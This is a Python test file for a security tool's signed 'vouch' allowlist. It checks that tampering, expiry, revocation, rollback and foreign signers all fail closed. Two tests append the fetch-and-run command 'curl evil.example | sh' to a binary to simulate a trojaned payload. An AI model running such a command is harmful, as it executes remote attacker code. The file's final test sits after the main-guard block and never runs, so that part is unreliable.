"""The vouch tier: a workload the operator signed for, by hand.

Measured cause, reference machine 2026-08-21: two self-hosted GitHub Actions
runners under ~/actions-runners produced 11 of one scan's 52 findings and 24 of
its 46 open incidents. They are ad-hoc signed, in a user-writable path, and
hold a permanent TLS connection to Microsoft -- every attribute the process,
net-outbound and net-beacon rules key on is DEFINITIONAL for a CI runner, so no
tuning of those rules could separate them from a real implant. The missing
evidence was never technical; the operator knows. This tier is the narrow,
revocable, cryptographically-bound way to say so.

These tests SIGN FOR REAL with a throwaway ed25519 key -- no mocked verifier --
because the only property worth testing here is that a forged or edited store
fails. Every suppression test is paired with the escape test that keeps it from
becoming a blind spot.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402

_PRINCIPAL = "operator@test.invalid"


def _have_ssh_keygen():
    return os.path.exists("/usr/bin/ssh-keygen")


@unittest.skipUnless(_have_ssh_keygen(), "ssh-keygen not available")
class VouchTier(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aegis_vouch_")
        state = os.path.join(self.tmp, ".aegis")
        os.makedirs(state)
        self._saved = {}
        for k, v in (("STATE_DIR", state),
                     ("VOUCH_FILE", os.path.join(state, "vouches.jsonl")),
                     ("VOUCH_SIGNERS", os.path.join(state, "vouch_signers"))):
            self._saved[k] = getattr(aegis, k)
            setattr(aegis, k, v)
        # A throwaway signing key. Passphrase-less ONLY because a test cannot
        # type one -- the passphrase is an operator-workflow property, not a
        # property of the verification code under test here.
        self.key = os.path.join(self.tmp, "vouchkey")
        subprocess.check_call(
            ["/usr/bin/ssh-keygen", "-t", "ed25519", "-N", "", "-C", "test",
             "-f", self.key], stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)
        with open(self.key + ".pub", encoding="utf-8") as f:
            pub = f.read().strip()
        with open(aegis.VOUCH_SIGNERS, "w", encoding="utf-8") as f:
            f.write("%s %s\n" % (_PRINCIPAL, pub))
        # The workload being vouched for.
        self.bin = os.path.join(self.tmp, "Runner.Listener")
        with open(self.bin, "w", encoding="utf-8") as f:
            f.write("#!/bin/sh\necho runner\n")

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _vouch(self, endpoints=(), ttl=None):
        rec = aegis._vouch_record("vouch", self.bin, _PRINCIPAL,
                                  endpoints=endpoints, ttl=ttl)
        return aegis._vouch_append(rec, self.key)

    # -- the tier works ----------------------------------------------------
    def test_a_signed_vouch_covers_exactly_those_bytes(self):
        self._vouch()
        self.assertTrue(aegis._vouch_covers(self.bin))
        vouches, tamper = aegis.load_vouches()
        self.assertIsNone(tamper)
        self.assertEqual(len(vouches), 1)

    def test_no_vouch_file_is_normal_not_tamper(self):
        """An operator who has never vouched for anything is the common case."""
        self.assertEqual(aegis.load_vouches(), ({}, None))
        self.assertEqual(aegis.check_vouch_store(), [])

    # -- every way out of the contract -------------------------------------
    def test_changing_the_bytes_escapes_the_vouch(self):
        """The whole point: 'the operator installed it' is a fact about one
        moment. A swapped payload at a vouched path must grade as unvouched."""
        self._vouch()
        self.assertTrue(aegis._vouch_covers(self.bin))
        with open(self.bin, "a", encoding="utf-8") as f:
            f.write("curl evil.example | sh\n")
        self.assertFalse(aegis._vouch_covers(self.bin))

    def test_an_expired_vouch_stops_covering(self):
        self._vouch(ttl=10)
        self.assertTrue(aegis._vouch_covers(self.bin))
        self.assertFalse(aegis._vouch_covers(
            self.bin, now=aegis._epoch() + 3600))

    def test_revocation_removes_it(self):
        self._vouch()
        rec = aegis._vouch_record("revoke", self.bin, _PRINCIPAL)
        aegis._vouch_append(rec, self.key)
        self.assertFalse(aegis._vouch_covers(self.bin))
        self.assertEqual(aegis.load_vouches()[0], {})

    def test_an_identity_vouch_never_wildcards_an_endpoint(self):
        """Codex's objection, pinned: a vouch with no endpoint set says nothing
        about where a binary may connect, so it can never quiet an exfil
        destination. Only the exact reviewed endpoint is covered."""
        self._vouch(endpoints=["20.85.130.105:443"])
        self.assertTrue(aegis._vouch_covers(self.bin, "20.85.130.105:443"))
        self.assertFalse(aegis._vouch_covers(self.bin, "185.99.1.7:443"))
        # And an identity-only vouch covers no endpoint at all.
        self.tearDown()
        self.setUp()
        self._vouch()
        self.assertFalse(aegis._vouch_covers(self.bin, "20.85.130.105:443"))

    # -- fail-closed -------------------------------------------------------
    def _corrupt(self, mutate):
        with open(aegis.VOUCH_FILE, encoding="utf-8") as f:
            lines = [ln for ln in f.read().splitlines() if ln.strip()]
        lines = mutate(lines)
        with open(aegis.VOUCH_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + ("\n" if lines else ""))

    def _assert_fails_closed(self, needle):
        vouches, tamper = aegis.load_vouches()
        self.assertEqual(vouches, {}, "a broken store must vouch for NOTHING")
        self.assertIsNotNone(tamper)
        self.assertIn(needle, tamper)
        crit = aegis.check_vouch_store()
        self.assertEqual(len(crit), 1)
        self.assertEqual(crit[0]["severity"], "CRITICAL")
        self.assertTrue(crit[0]["attack_defined"])

    def test_editing_a_record_discards_the_whole_set(self):
        self._vouch()
        second = os.path.join(self.tmp, "other")
        with open(second, "w", encoding="utf-8") as f:
            f.write("x")
        aegis._vouch_append(
            aegis._vouch_record("vouch", second, _PRINCIPAL), self.key)

        def mutate(lines):
            rec = json.loads(lines[0])
            rec["sha256"] = "0" * 64          # forge the vouched digest
            lines[0] = json.dumps(rec, sort_keys=True, separators=(",", ":"))
            return lines
        self._corrupt(mutate)
        self._assert_fails_closed("not signed by a pinned signer")

    def test_deleting_a_record_is_detected_as_a_rollback(self):
        """Partial trust is worse than none: without the chain, an attacker
        deletes the one record that would have made their change loud."""
        self._vouch()
        second = os.path.join(self.tmp, "other")
        with open(second, "w", encoding="utf-8") as f:
            f.write("x")
        aegis._vouch_append(
            aegis._vouch_record("vouch", second, _PRINCIPAL), self.key)
        self._corrupt(lambda lines: lines[1:])
        self._assert_fails_closed("hash chain")

    def test_a_foreign_signer_is_refused(self):
        self._vouch()
        other = os.path.join(self.tmp, "attacker")
        subprocess.check_call(
            ["/usr/bin/ssh-keygen", "-t", "ed25519", "-N", "", "-C", "evil",
             "-f", other], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        third = os.path.join(self.tmp, "implant")
        with open(third, "w", encoding="utf-8") as f:
            f.write("implant")
        aegis._vouch_append(
            aegis._vouch_record("vouch", third, _PRINCIPAL), other)
        self._assert_fails_closed("not signed by a pinned signer")

    def test_an_unpinned_roster_refuses_to_trust_anything(self):
        self._vouch()
        os.unlink(aegis.VOUCH_SIGNERS)
        self._assert_fails_closed("no signer roster is pinned")

    def test_appending_to_a_broken_chain_is_refused(self):
        """A forged log must not be launderable by adding a good record."""
        self._vouch()
        self._corrupt(lambda lines: lines + ["{\"seq\": 99}"])
        with self.assertRaises(ValueError):
            aegis._vouch_append(
                aegis._vouch_record("vouch", self.bin, _PRINCIPAL), self.key)


@unittest.skipUnless(_have_ssh_keygen(), "ssh-keygen not available")
class EndpointRotationBatchesIntoTheWorkloadCase(VouchTier):
    """A vouched workload reaching an UNREVIEWED endpoint.

    Binding a vouch to an exact endpoint set is right — an identity vouch that
    widened into "may contact anything on 443" would hide the one connection
    worth seeing. But a provider that rotates addresses then re-alerts as a
    cold, brand-new HIGH beacon on every rotation, which is the alert fatigue
    the precision tier exists to end and which trains the operator to silence
    beacons by hand-editing a trust store.

    So the rotation joins the workload's own case. Severity is NOT reduced —
    nothing here decides the new endpoint is benign, only which case the
    operator reads it in.
    """

    def test_an_unreviewed_endpoint_batches_into_the_workload_case(self):
        self._vouch(endpoints=["20.85.130.105:443"])
        case, note = aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443")
        self.assertIsNotNone(case)
        self.assertIn("vouched-endpoint:", case)
        self.assertIn("NOT reduced", note)

    def test_two_rotations_share_one_case(self):
        """The point: N rotations are one thing to decide, not N cold alerts."""
        self._vouch(endpoints=["20.85.130.105:443"])
        a, _ = aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443")
        b, _ = aegis._vouch_endpoint_deviation(self.bin, "8.9.10.11:443")
        self.assertEqual(a, b)

    def test_severity_is_never_reduced_by_a_deviation(self):
        """Safety: batching is a RENDERING decision. `_grade_binary` must still
        refuse to demote an endpoint the vouch does not cover."""
        self._vouch(endpoints=["20.85.130.105:443"])
        self.assertEqual(
            aegis._grade_binary("HIGH", self.bin, endpoint="4.5.6.7:443")[:2],
            ("HIGH", None))

    def test_the_reviewed_endpoint_is_not_a_deviation(self):
        self._vouch(endpoints=["20.85.130.105:443"])
        self.assertEqual(
            aegis._vouch_endpoint_deviation(self.bin, "20.85.130.105:443"),
            (None, None))

    def test_an_unvouched_binary_is_never_batched(self):
        """Safety, and the whole boundary: an implant that was never vouched
        must keep opening its own cold case per endpoint. Batching is a
        privilege of having been signed for."""
        self.assertEqual(
            aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443"),
            (None, None))


if __name__ == "__main__":
    unittest.main()

    def test_a_swapped_payload_at_a_vouched_path_is_never_batched(self):
        """Safety: batching keys on the CONTRACT, and changed bytes escape the
        contract. A trojaned binary at a vouched path gets no shelter."""
        self._vouch(endpoints=["20.85.130.105:443"])
        with open(self.bin, "a", encoding="utf-8") as f:
            f.write("curl evil.example | sh\n")
        self.assertEqual(
            aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443"),
            (None, None))
